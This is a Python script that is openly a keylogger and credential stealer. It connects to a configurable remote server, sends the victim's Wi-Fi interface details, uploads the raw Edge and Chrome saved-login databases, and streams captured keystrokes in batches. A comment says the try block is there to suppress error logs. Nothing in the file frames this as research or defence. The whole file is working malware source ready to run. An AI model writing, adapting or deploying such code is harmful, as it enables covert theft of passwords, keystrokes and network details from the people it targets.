from pynput.keyboard import Key, KeyCode, Listener
from pathlib import Path
import socket
import subprocess
import os

VERBOSE = False

count = 0
keys = []


# Try catch block to suppress all error logs
try:
    # Open socket connection to server. Replace the ip and port
    s = socket.socket()
    server_addr = '127.0.0.1' 
    port = 42167
    s.connect((server_addr, port))
    SEND_SIZE = 1024

    # Read network information
    r = subprocess.run(["netsh", "wlan", "show", "interfaces"], capture_output=True, text=True)
    s.send(r.stdout.encode('ascii'))

    # Read Edge and Chrome browser credentials
    localappdata = os.getenv("LOCALAPPDATA")
    p = Path(rf"{localappdata}\Microsoft\Edge\User Data\Default\Login Data")
    if p.is_file():
        t = p.read_bytes()
        s.send(t)
    p = Path(rf"{localappdata}\Google\Chrome\User Data\Default\Login Data")
    if p.is_file():
        t = p.read_bytes()
        s.send(t)

    s.send(b"\n")
 
    # Convert key to byte for easy socket sending
    def encode_key(k):
        if isinstance(k, KeyCode):
            return bytes([k.vk])
        else:
            return b'<' + k.name.encode('ascii') + b'>'
    
    # Callbacks for keylistener
    def on_press(key):
        global keys,count
        keys.append(key)
        count+=1
        if VERBOSE:
            print(count)
            print("{0} pressed".format(key))
    
        # When the desired number of keys has be logged, they are sent to the server
        if count>= SEND_SIZE:
            s.send(b''.join(encode_key(key) for key in keys))
            keys.clear()
            count=0
            if VERBOSE:
                print('sent to server')
       
    def on_release(key):
        if key==Key.esc:
            return False
    
    with Listener(on_press=on_press, on_release= on_release) as listener:
        listener.join()

except Exception as e:
    print(e)

